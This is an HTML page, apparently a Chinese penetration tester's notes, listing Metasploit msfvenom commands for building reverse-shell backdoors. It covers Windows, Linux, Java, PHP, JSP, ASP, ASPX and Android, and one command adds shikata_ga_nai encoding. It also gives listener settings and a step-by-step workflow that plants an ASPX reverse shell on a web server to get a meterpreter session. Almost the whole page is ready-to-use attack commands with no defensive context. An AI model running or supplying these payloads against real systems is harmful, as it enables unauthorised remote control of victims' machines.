@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<title>Msf生成多种后门(收集中)</title>
+<style>
+			body{
+				width: 92%;
+				background-color:#B2DFEE;
+				padding:0 4%;
+			}
+			*{
+				margin: 0 auto;
+				padding: 0;
+			}
+		</style>
+		</head>
+<body >
+<div>
+
+
+<br/><br/>
+<!--文章title-->
+<center>
+<font style="FONT-FAMILY: Comic Sans MS;"><strong><h2>Msf生成多种后门(收集中)</h2></strong></font>
+</center>
+<!--主体内容-->
+<div><br/><br/>
+<span style="padding:5px 10px;overflow:hidden;font-weight:bold;font-size:16px;color:#0A0A0A;">
+<p style="text-indent:32px">
+<pre>
+Metasploit之多种后门生成
+参考文献：http://netsec.ws/?p=331
+          http://www.ithao123.cn/content-10813776.html
+          http://www.evil0x.com/posts/838.html（Metasploit 渗透测试笔记(Meterpreter篇)）
+
+windows    -->使用模块“windows/meterpreter/reverse_tcp”
+命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=44444 X >test.exe
+参考“09-Metasploit之我的远程控制软件”
+
+linux      -->使用模块“linux/x86/meterpreter/shell_rverse_tcp”
+命令：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 X >text
+参考文章：http://xiao106347.blog.163.com/blog/static/215992078201310253172937/
+
+java       -->使用模块“java/meterpreter/reverse_tcp”
+命令：msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 W >text.jar
+
+php        -->使用模块“php/meterpreter/reverse_tcp”
+命令：msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 -f raw >text.php
+参考文章：http://www.111cn.net/phper/phpanqn/101228.htm
+
+jsp        -->使用模块“java/jsp_shell_reverse_tcp”
+命令：msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.2.146 LPORT=1234 R >text.jsp
+参考文章：http://netsecurity.51cto.com/art/201406/442648.htm
+
+asp        -->使用模块“windows/meterpreter/reverse_tcp”
+命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 -f asp > shell.asp
+参考文章：http://www.ithao123.cn/content-10813776.html
+
+aspx       -->使用模块“windows/meterpreter/reverse_tcp”
+命令：msfvenom -a x86 --platform win -p windows/meterpreter/reverse_tcp LHOST= 192.168.1.109 LPORT=7788 -f aspx x> /home/niexinming/back.aspx
+参考文章：http://www.ithao123.cn/content-10813776.html
+
+android    -->使用模块“android/meterpreter/reverse_tcp”
+命令：msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 R >text.apk
+参考“13-Metasploit之渗透安卓实战”
+
+exe       -->使用模块“windows/meterpreter/reverse_tcp”
+命令：msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.1.106 LPORT=1234 -f exe > ./test.exe
+
+反弹连接的访问(开启监听)：
+use exploit/multi/handler
+set PAYLOAD <Payload name>
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+set ExitOnSession false
+exploit -j -z
+
+------------------------------------------------------------------------------------------------
+Metasploit-web利用过程
+参考文献：http://www.ithao123.cn/content-10813776.html
+
+首先用Metasploit生成反弹马，也就是生成反弹的payload：
+成功生成反弹型payload：
+（1）
+生成win下的exe
+msfvenom -a x86 --platform win -p windows/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=5566 -f exe x> /home/niexinming/back.exe 
+
+（2）
+生成win下的aspx
+msfvenom -a x86 --platform win -p windows/meterpreter/reverse_tcp LHOST= 192.168.1.109 LPORT=7788 -f aspx x> /home/niexinming/back.aspx
+其他的生成payload 的方法见：http://netsec.ws/?p=331
+
+（3）
+我生成一个aspx的反弹马，然后启动msfconsole
+
+ (4）
+本地监听，反弹后的控制端：use exploit/multi/handler
+
+（5）
+本地监听的确定用哪个payload：
+set payload windows/meterpreter/reverse_tcp
+
+（6）
+设置本地监听的端口：
+set lport 7788
+
+（7）
+设置本地的监听的地址：
+set lhost 0.0.0.0
+
+（8）
+运行：
+run
+
+（9）
+访问生成的反弹马：
+http://xxx.xxx.xx.xxx:/back.aspx
+
+得到meterpreter的shell
+
+</pre>
+</p><br/>
+</span>
+<p style="text-indent:32px"></p><br/>
+
+
+</div><br/><br/>
+
+<center>
+<h4 >著：module&nbsp;&nbsp; </h4><br/>
+<input type="button" name="button1" id="button1" value="返回" onclick="history.go(-1)"> OR
+<input type="button" name="button1" id="button1" value="打印" onclick="javascript:window.print()"> <br/><br/>
+<script type="text/javascript">document.write(['<a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=',encodeURIComponent(location.href),'&title=',encodeURIComponent(document.title),'" target="_blank"  style="text-decoration:none;"  title="分享到QQ空间">分享到QQ空间<\/a>'].join(''));</script>
+</center>
+</div>
+<br/><br/>
+
+</body>
+</html>
